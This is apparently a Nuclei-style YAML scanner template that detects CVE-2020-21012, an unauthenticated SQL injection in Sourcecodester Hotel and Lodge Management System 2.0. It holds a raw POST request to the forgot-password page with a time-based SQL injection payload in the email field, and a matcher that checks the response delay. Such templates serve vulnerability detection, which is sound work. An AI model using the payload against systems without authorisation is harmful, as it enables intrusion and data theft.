id: CVE-2020-21012

info:
  name: Sourcecodester Hotel and Lodge Management System 2.0 - SQL Injection
  author: edoardottt
  severity: critical
  description: |
    Sourcecodester Hotel and Lodge Management System 2.0 is vulnerable to unauthenticated SQL injection and can allow remote attackers to execute arbitrary SQL commands via the email parameter to the edit page for Customer, Room, Currency, Room Booking Details, or Tax Details.
  reference:
    - https://github.com/hitIer/web_test/tree/master/hotel
    - https://nvd.nist.gov/vuln/detail/CVE-2020-21012
  classification:
    cve-id: CVE-2020-21012
  tags: cve,sourcecodester,cve2020,sqli

requests:
  - raw:
      - |
        POST /forgot_password.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        btn_forgot=1&email=1' or sleep(5)%23

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'

      - type: status
        status:
          - 200